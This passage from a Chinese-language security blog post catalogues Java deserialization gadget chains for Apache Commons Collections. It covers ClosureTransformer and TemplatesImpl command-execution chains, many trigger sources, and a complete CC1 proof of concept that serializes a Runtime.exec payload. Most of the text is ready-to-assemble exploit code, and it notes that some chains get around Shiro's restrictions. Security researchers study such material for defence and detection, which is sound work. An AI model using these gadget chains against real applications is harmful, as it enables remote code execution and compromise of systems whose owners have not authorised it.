了ChainedTransformer之外，还有一些方法是可以进行链式调用的，比如这个ClosureTransformer。\n参考文档：https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/CollectionUtils.html\nPredicate predicate4 = new TransformedPredicate(        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;), null);Predicate predicate3 = new TransformedPredicate(        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;), predicate4);Predicate predicate2 = new TransformedPredicate(        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[]&#123;&#125;&#125;), predicate3);Predicate predicate1 = new TransformedPredicate(        new ConstantTransformer(Runtime.class), predicate2);Closure closure = new IfClosure(predicate1, null, null);Transformer transformer = new ClosureTransformer(closure);\n\n原理首先可以看到org.apache.commons.collections.functors.TransformedPredicate#evaluate这个方法，\n\n可以看到他能调用任意transform()方法，并且作为参数传递给下一个Predicate看到这里是不是很熟悉，和ChainedTransformer#transform方法有点类似。\n再看到org.apache.commons.collections.functors.IfClosure#evaluate方法，他可以调用任意方法的evaluate方法。\n\n现在只需要找到一个transform方法，可以调用evaluate方法即可将其串联起来实现和ChainedTransformer一样的功能，找到org.apache.commons.collections.functors.ClosureTransformer。\n\n他和ChainedTransformer相似，但是又有所不同，由于使用的是Predicate所以其是不受shiro的数组限制的，可以直接在shiro中进行链式调用无需加载字节码。\n调用&amp;触发由于最终还是要调用ClosureTransformer#transfomer，因此触发条件和上面的ChainedTransformer是一样的，只要能调用ChainedTransformer的就可以调用ClosureTransformer#compare。\nTemplateImpl加载字节码TemplatesImpl templates = new TemplatesImpl();Class tc=templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;E://Test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates,new TransformerFactoryImpl());templates.newTransformer();\n\n原理TemplatesImpl这个类中的字节码是由TransletClassLoader进行加载的，这个类继承了ClassLoader并且重写了defineClass方法。\n\n重写的defineClass方法变为了default类型，可以被类外部进行调用，这里主要过一下TemplatesImpl的调用链，至于具体是怎么进行加载字节码的，这里就是动态加载字节码的类加载机制的问题了，已经有很多佬们讲解过了，这里就不继续深入讲解了。\n首先是从TransletClassLoader#defineClass()开始寻找谁对他进行了调用\n\n可以找到TemplatesImpl#defineTransletClasses()，但是是private继续寻找\n\n找到TemplatesImpl#getTransletInstance()，也是private，继续寻找\n\n找到TemplatesImpl#newTransformer()这个是一个public方法，因此只需要可以调用这个方法就可以加载字节码了。\n调用&amp;触发这里主要由俩个触发点，一个是由InvokerTransformer来反射他的newTransformer()方法进行调用，另一个是由TrAXFilter#TrAXFilter()方法来触发newTransformer()，当然哈，因为这个类也是不能进行序列化的，所以也需要一些其他的类通过构造函数赋值并实例化。\nInvokerTransformer调用newTransformer()这里还是通过ChainedTransformer来进行自动传参和链式调用的。\nTemplatesImpl templates = new TemplatesImpl();Class tc=templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;E://Test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates,new TransformerFactoryImpl());Transformer[] transformers = new Transformer[]&#123;        new ConstantTransformer(templates),        new InvokerTransformer(&quot;newTransformer&quot;,null,null)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n当然使用上面的ClosureTransformer进行链式调用也是ok的\nTemplatesImpl templates = new TemplatesImpl();setFieldValue(templates,&quot;_name&quot;,&quot;1vxyz&quot;);byte[] code = Files.readAllBytes(Paths.get(&quot;E://Test.class&quot;));byte[][] codes = &#123;code&#125;;setFieldValue(templates,&quot;_bytecodes&quot;,codes);setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());Predicate predicate2 = new TransformedPredicate(        new InvokerTransformer(&quot;newTransformer&quot;,null,null), null);Predicate predicate1 = new TransformedPredicate(        new ConstantTransformer(templates), predicate2);Closure closure = new IfClosure(predicate1, null, null);Transformer transformer = new ClosureTransformer(closure);\n\n下面对transform调用和前面的一样就行。\nTrAXFilter#TrAXFilter调用newTransformer()可以看到图中在进行参数赋值的时候就调用了他的newTransformer()函数。\n\n上面说到了TrAXFilter其实是无法进行序列化的，因此这里会使用一些其他的类对其进行调用。\nInstantiateTransformer首先是InstantiateTransformer#transform\nTransformer[] transformers = new Transformer[]&#123;          new ConstantTransformer(TrAXFilter.class),          new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)  &#125;;    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n\n\n这个方法对传入参数进行了实例化的操作。当然，因为他也是transfrom方法，用于自动化传参的方式还是ChainedTransformer，后续调用和之前一样。\nFactoryTransformer当然除了InstantiateTransformer#transform之外，还有FactoryTransformer#transform与InstantiateFactory#create相结合也可以做到这一点，并且因为InstantiateFactory的构造函数，使其不需要ChainedTransformer就可以使用。\nInstantiateFactory instantiateFactory=new InstantiateFactory(TrAXFilter.class,new Class[] &#123;Templates.class&#125;,new Object[]&#123;templates&#125;);FactoryTransformer factoryTransformer=new FactoryTransformer( instantiateFactory);\n\n可以看到FactoryTransformer#transform调用了一个Factory的create方法\n\n而InstantiateFactory#create的效果和InstantiateTransformer#transform效果一致\n\n并且因为InstantiateFactory的构造函数可以直接将TrAXFilter与Templates都传进去，所以是不需要使用ChainedTransformer的。\n\n因为还是要调用InstantiateTransformer#transform方法，因此后续调用和之前调用ChainedTransformer#tansfrom方法的调用是一样的。\n调用部分接下来就只需要将上面的命令执行部分和下面的调用部分拼接起来就可以了，因为有点小多就当一个整理了。\n[LazyMap&#x2F;DefaultedMap].get()EventListenerList-&gt;toStringEventListenerList list = new EventListenerList();UndoManager manager = new UndoManager();Vector vector = (Vector) getFieldValue(manager, &quot;edits&quot;);vector.add(mapEntry);setFieldValue(list, &quot;listenerList&quot;, new Object[] &#123; Map.class, manager &#125;);\n\nHotSwappableTargetSource &amp; XString-&gt;tostringObject xstring;HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(mapEntry);xstring = createWithoutConstructor(&quot;com.sun.org.apache.xpath.internal.objects.XStringForFSB&quot;);setFieldValue(xstring, &quot;m_obj&quot;, &quot;1&quot;);xstring = createWithoutConstructor(&quot;com.sun.org.apache.xpath.internal.objects.XStringForChars&quot;);setFieldValue(xstring, &quot;m_obj&quot;, new char[5]);xstring = new XString(null);HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(xstring);HashMap val = new HashMap();val.put(hotSwappableTargetSource1,&quot;1&quot;);val.put(hotSwappableTargetSource2,&quot;2&quot;);\n\nCaseInsensitiveMap-&gt;tostringMap s= (Map) createWithoutConstructor(&quot;org.apache.commons.collections.map.CaseInsensitiveMap&quot;);Class&lt;?&gt; nodeB;nodeB = Class.forName(&quot;org.apache.commons.collections.map.AbstractHashedMap$HashEntry&quot;);Constructor&lt;?&gt; nodeCons = nodeB.getDeclaredConstructor(nodeB,int.class, Object.class, Object.class);nodeCons.setAccessible(true);Object tbl = Array.newInstance(nodeB, 1);Array.set(tbl, 0, nodeCons.newInstance(null,0, mapEntry, mapEntry));setsuperFieldValue(s, &quot;data&quot;, tbl);setsuperFieldValue(s, &quot;size&quot;, 1);\n\nhashtable-&gt;tostringMap tHashMap1 = (Map) createWithoutConstructor(&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;);Map tHashMap2 = (Map) createWithoutConstructor(&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;);tHashMap1.put(mapEntry,&quot;Unam4&quot;);tHashMap2.put(mapEntry,&quot;SpringKill&quot;);setFieldValue(tHashMap1,&quot;loadFactor&quot;,1);setFieldValue(tHashMap2,&quot;loadFactor&quot;,1);Hashtable hashtable = new Hashtable();hashtable.put(tHashMap1,&quot;Unam4&quot;);hashtable.put(tHashMap2,&quot;SpringKill&quot;);tHashMap1.put(mapEntry, null);tHashMap2.put(mapEntry, null);\n\nBadAttributeValueExpException-&gt;tostringBadAttributeValueExpException poc = new BadAttributeValueExpException(1);Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);val.setAccessible(true);val.set(poc, mapEntry);\n\nAnnotationInvocationHandler-&gt;tostring (jdk&lt;8u20)HashMap&lt;Object, Object&gt; map1 = new HashMap&lt;&gt;();map1.put(&quot;value&quot;,mapEntry);Class&lt;?&gt; AnnotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor&lt;?&gt; Anotationdeclared = AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);Anotationdeclared.setAccessible(true);InvocationHandler h = (InvocationHandler) Anotationdeclared.newInstance(Target.class, map1);\n\nhashmap-&gt;tostring(jdk8u181)Map tHashMap1 = (Map) createWithoutConstructor(&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;);Map tHashMap2 = (Map) createWithoutConstructor(&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;);tHashMap1.put(mapEntry,null);tHashMap2.put(mapEntry,null);setFieldValue(tHashMap1,&quot;loadFactor&quot;,1);setFieldValue(tHashMap2,&quot;loadFactor&quot;,1);HashMap hashMap = new HashMap();Class node = Class.forName(&quot;java.util.HashMap$Node&quot;);Constructor constructor = node.getDeclaredConstructor(int.class, Object.class, Object.class, node);constructor.setAccessible(true);Object node1 = constructor.newInstance(0, tHashMap1, null, null);Object node2 = constructor.newInstance(0, tHashMap2, null, null);setFieldValue(hashMap, &quot;size&quot;, 2);Object arr = Array.newInstance(node, 2);Array.set(arr, 0, node1);Array.set(arr, 1, node2);setFieldValue(hashMap, &quot;table&quot;, arr);\n\nHotSwappableTargetSource-&gt;equalsHotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(mapEntry);HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(new XString(null));HashMap val = new HashMap();val.put(hotSwappableTargetSource1, &quot;1&quot;);val.put(hotSwappableTargetSource2, &quot;2&quot;);\n\nHashtable-&gt;equalsHashtable hashtable = new Hashtable();setFieldValue(hashtable,&quot;count&quot;,2);Class&lt;?&gt; nodeC;nodeC = Class.forName(&quot;java.util.Hashtable$Entry&quot;);Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);nodeCons.setAccessible(true);Object tbl = Array.newInstance(nodeC, 2);Array.set(tbl, 0, nodeCons.newInstance(0, mapEntry, &quot;Unam4&quot;, null));Array.set(tbl, 1, nodeCons.newInstance(0, mapEntry, &quot;Springkill&quot;, null));setFieldValue(hashtable, &quot;table&quot;, tbl);\n\nHashMap-&gt;equalsHashMap&lt;Object, Object&gt; s = new HashMap&lt;&gt;();setFieldValue(s, &quot;size&quot;, 2);Class&lt;?&gt; nodeC;try &#123;    nodeC = Class.forName(&quot;java.util.HashMap$Node&quot;);&#125; catch (ClassNotFoundException e) &#123;    nodeC = Class.forName(&quot;java.util.HashMap$Entry&quot;);&#125;Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);nodeCons.setAccessible(true);Object tbl = Array.newInstance(nodeC, 2);Array.set(tbl, 0, nodeCons.newInstance(0, mapEntry, &quot;key1&quot;, null));Array.set(tbl, 1, nodeCons.newInstance(0, mapEntry, &quot;key2&quot;, null));setFieldValue(s, &quot;table&quot;, tbl);\n\nConcurrentHashMap-&gt;equalsConcurrentHashMap&lt;Object, Object&gt; s = new ConcurrentHashMap&lt;&gt;();setFieldValue(s, &quot;sizeCtl&quot;, 2);Class&lt;?&gt; nodeC;try &#123;    nodeC = Class.forName(&quot;java.util.concurrent.ConcurrentHashMap$Node&quot;);&#125; catch (ClassNotFoundException e) &#123;    nodeC = Class.forName(&quot;java.util.concurrent.ConcurrentHashMap$Node&quot;);&#125;Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);nodeCons.setAccessible(true);Object tbl = Array.newInstance(nodeC, 2);Array.set(tbl, 0, nodeCons.newInstance(0, mapEntry, &quot;zZ&quot;, null));Array.set(tbl, 1, nodeCons.newInstance(0, mapEntry, &quot;yy&quot;, null));setFieldValue(s, &quot;table&quot;, tbl);\n\nflat3Map-&gt;hashcodeMap s= (Map) new Flat3Map();//避免构造函数触发Class&lt;?&gt; nodeB;nodeB = Class.forName(&quot;org.apache.commons.collections.map.AbstractHashedMap$HashEntry&quot;);HashedMap hashedMap = new HashedMap();Constructor&lt;?&gt; nodeCons = nodeB.getDeclaredConstructor(nodeB,int.class, Object.class, Object.class);nodeCons.setAccessible(true);Object tbl = Array.newInstance(nodeB, 1);Array.set(tbl, 0, nodeCons.newInstance(null,0, mapEntry, mapEntry));setsuperFieldValue(hashedMap, &quot;data&quot;, tbl);setsuperFieldValue(hashedMap, &quot;size&quot;, 1);setFieldValue(s,&quot;delegateMap&quot;,hashedMap);\n\nhashed-&gt;hashcodeMap s= (Map) createWithoutConstructor(&quot;org.apache.commons.collections.map.HashedMap&quot;);Class&lt;?&gt; nodeB;nodeB = Class.forName(&quot;org.apache.commons.collections.map.AbstractHashedMap$HashEntry&quot;);Constructor&lt;?&gt; nodeCons = nodeB.getDeclaredConstructor(nodeB,int.class, Object.class, Object.class);nodeCons.setAccessible(true);Object tbl = Array.newInstance(nodeB, 1);Array.set(tbl, 0, nodeCons.newInstance(null,0, mapEntry, mapEntry));setsuperFieldValue(s, &quot;data&quot;, tbl);setsuperFieldValue(s, &quot;size&quot;, 1);\n\ndualHashBidiMap-&gt;hashcodeDualHashBidiMap dualHashBidiMap = new DualHashBidiMap();Map[] mapArray = new HashMap[1];mapArray[0] = new HashMap();//避免put时触发hashcode问题Class&lt;?&gt; nodeD;try &#123;    nodeD = Class.forName(&quot;java.util.HashMap$Node&quot;);&#125; catch (ClassNotFoundException e) &#123;    nodeD = Class.forName(&quot;java.util.HashMap$Entry&quot;);&#125;Constructor&lt;?&gt; nodeDons = nodeD.getDeclaredConstructor(int.class, Object.class, Object.class, nodeD);nodeDons.setAccessible(true);Object tbl = Array.newInstance(nodeD, 1);Array.set(tbl, 0, nodeDons.newInstance(0, mapEntry, &quot;unam4&quot;, null));setFieldValue( mapArray[0], &quot;size&quot;, 1);setFieldValue(mapArray[0], &quot;table&quot;, tbl);setsuperFieldValue(dualHashBidiMap, &quot;maps&quot;, mapArray);\n\ncss-&gt;hashcodeCSS css = new CSS();Hashtable hashtable = new Hashtable();hashtable.put(&quot;&quot;,mapEntry);setFieldValue(css, &quot;valueConvertor&quot;, hashtable);setFieldValue(css, &quot;baseFontSize&quot;, 1);\n\nDualLinkedHashBidiMap-&gt;hashcodeMap expMap = new HashMap();expMap.put(&quot;222&quot;, tiedMapEntry);DualLinkedHashBidiMap dualLinkedHashBidiMap = new DualLinkedHashBidiMap();Field field1 = dualLinkedHashBidiMap.getClass().getSuperclass().getDeclaredField(&quot;normalMap&quot;);field1.setAccessible(true);field1.set(dualLinkedHashBidiMap, expMap);\n\nAnnotationInvocationHandle-&gt;map.getClass&lt;?&gt; AnnotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor&lt;?&gt; Anotationdeclared =        AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);Anotationdeclared.setAccessible(true);InvocationHandler h = (InvocationHandler) Anotationdeclared.newInstance(Override.class, lazymap/DefaultedMap);Map Mapproxy =(Map) Proxy.newProxyInstance(Anotationdeclared.getClass().getClassLoader(),new Class[]&#123;Map.class&#125;, h);Object instance =Anotationdeclared.newInstance(Override.class, Mapproxy);\n\nTransformedMap.setValue()AnnotationInvocationHandler触发TransformedMap(CC1)package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.map.TransformedMap;import org.omg.CORBA.portable.InvokeHandler;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.*;import java.util.Base64;import java.util.HashMap;import java.util.Map;public class CC1 &#123;    public static void main(String[] args) throws InvocationTargetException, InstantiationException, IllegalAccessException &#123;//        try &#123;//            Runtime.getRuntime().exec(&quot;calc&quot;);//        &#125; catch (IOException e) &#123;//            throw new RuntimeException(e);//        &#125;//        Transformer[] transformers = new Transformer[]&#123;//                new ConstantTransformer(Runtime.class),//                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),//                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),//                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;),//        &#125;;        System.setProperty(&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;, &quot;true&quot;);        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;),        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();        map.put(&quot;value&quot;,&quot;key&quot;);        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,chainedTransformer);        try &#123;            Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);            Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);            constructor.setAccessible(true);            Object o = constructor.newInstance(Target.class,transformedMap);            Serialize(o);            Unserialize(&quot;ser.bin&quot;);        &#125; catch (ClassNotFoundException | NoSuchMethodException | IOException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;    public static void Serialize(Object obj) throws IOException &#123;        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        objectOutputStream.writeObject(obj);    &#125;    public static Object Unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));        Object obj = objectInputStream.readObject();        return obj;    &#125;&#125;\n\nTransformingComparator.compare(){Commons-Collections4}Hashtable-&gt;compareTreeMap&lt;Object,Object&gt; m1 = new TreeMap&lt;&gt;(transformingComparator);setFieldValue(m1, &quot;size&quot;, 1);setFieldValue(m1, &quot;modCount&quot;, 1);Class&lt;?&gt; nodeC = Class.forName(&quot;java.util.TreeMap$Entry&quot;);Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);nodeCons.setAccessible(true);Object node = nodeCons.newInstance(transformingComparator, 1, null);setFieldValue(m1, &quot;root&quot;, node);TreeMap&lt;Object,Object&gt; m2 = new TreeMap&lt;&gt;(transformingComparator);setFieldValue(m2, &quot;size&quot;, 1);setFieldValue(m2, &quot;modCount&quot;, 1);setFieldValue(m2, &quot;root&quot;, node);Hashtable hashtable = new Hashtable();setFieldValue(hashtable,&quot;count&quot;,2);Class&lt;?&gt; nodeD;nodeD = Class.forName(&quot;java.util.Hashtable$Entry&quot;);Constructor&lt;?&gt; nodeDons = nodeD.getDeclaredConstructor(int.class, Object.class, Object.class, nodeD);nodeDons.setAccessible(true);Object tbl = Array.newInstance(nodeD, 2);Array.set(tbl, 0, nodeDons.newInstance(0, m1, &quot;Unam4&quot;, null));Array.set(tbl, 1, nodeDons.newInstance(0, m2, &quot;Springkill&quot;, null));setFieldValue(hashtable, &quot;table&quot;, tbl);\n\nPriorityQueue-&gt;comparePriorityQueue queue = new PriorityQueue(1);setFieldValue(queue, &quot;size&quot;, 2);setFieldValue(queue, &quot;comparator&quot;, transformingComparator);setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;transformingComparator,1&#125;);\n\nAnnotationInvocationHandler -&gt;compareTransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));Map treeMap = new TreeMap(transformingComparator);treeMap.put(&quot;key&quot;,&quot;value&quot;);setFieldValue(transformingComparator,&quot;transformer&quot;,chainedTransformer);Class&lt;?&gt; AnnotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor&lt;?&gt; Anotationdeclared =        AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);Anotationdeclared.setAccessible(true);InvocationHandler h = (InvocationHandler) Anotationdeclared.newInstance(Override.class, treeMap);Map Mapproxy =(Map) Proxy.newProxyInstance(Anotationdeclared.getClass().getClassLoader(),new Class[]&#123;Map.class&#125;, h);Object o1 =Anotationdeclared.newInstance(Override.class, Mapproxy);\n\nhashmap-&gt;compareTransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));TreeMap treeMap1 = new TreeMap(transformingComparator);treeMap1.put(&quot;1&quot;, 1);TreeMap treeMap2 = new TreeMap(transformingComparator);treeMap2.put(&quot;1&quot;,1);setFieldValue(transformingComparator,&quot;transformer&quot;,chainedTransformer);HashMap&lt;Object, Object&gt; s = new HashMap&lt;&gt;();setFieldValue(s, &quot;size&quot;, 2);Class&lt;?&gt; nodeC;try &#123;    nodeC = Class.forName(&quot;java.util.HashMap$Node&quot;);&#125; catch (ClassNotFoundException e) &#123;    nodeC = Class.forName(&quot;java.util.HashMap$Entry&quot;);&#125;Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);nodeCons.setAccessible(true);Object tbl = Array.newInstance(nodeC, 2);Array.set(tbl, 0, nodeCons.newInstance(0, treeMap1, &quot;key1&quot;, null));Array.set(tbl, 1, nodeCons.newInstance(0, treeMap2, &quot;key2&quot;, null));setFieldValue(s, &quot;table&quot;, tbl);\n\ntreebag—&gt;compareTransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));TreeBag treeBag = new TreeBag(transformingComparator);treeBag.add(1);setFieldValue(transformingComparator,&quot;transformer&quot;,chainedTransformer);\n\nConcurrentHashMap-&gt;compareTransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));TreeMap treeMap1 = new TreeMap(transformingComparator);treeMap1.put(transformingComparator, 1);TreeMap treeMap2 = new TreeMap(transformingComparator);treeMap2.put(transformingComparator,1);setFieldValue(transformingComparator,&quot;transformer&quot;,chainedTransformer);ConcurrentHashMap&lt;Object, Object&gt; s = new ConcurrentHashMap&lt;&gt;();setFieldValue(s, &quot;sizeCtl&quot;, 2);Class&lt;?&gt; nodeC;try &#123;    nodeC = Class.forName(&quot;java.util.concurrent.ConcurrentHashMap$Node&quot;);&#125; catch (ClassNotFoundException e) &#123;    nodeC = Class.forName(&quot;java.util.concurrent.ConcurrentHashMap$Node&quot;);&#125;Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);nodeCons.setAccessible(true);Object tbl = Array.newInstance(nodeC, 2);Array.set(tbl, 0, nodeCons.newInstance(0, treeMap1, &quot;unam4&quot;, null));Array.set(tbl, 1, nodeCons.newInstance(0, treeMap2, &quot;springkill&quot;, null));setFieldValue(s, &quot;table&quot;, tbl);\n\nDualTreeBidiMapr-&gt;compareTransformingComparator comparator = new TransformingComparator(new ConstantTransformer(1));DualTreeBidiMap dualTreeBidiMap = new DualTreeBidiMap(comparator, comparator);dualTreeBidiMap.put(&quot;demo&quot;, &quot;demo&quot;);setFieldValue(comparator,&quot;transformer&quot;, chainedTransformer);\n\n参考文章https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/#map-get-%E8%A7%A6%E5%8F%91InstantiateTransformer\nhttps://xz.aliyun.com/news/14431#/\nhttps://forum.butian.net/share/1233#/\n","categories":["java反序列化"],"tags":["java反序列化"]}]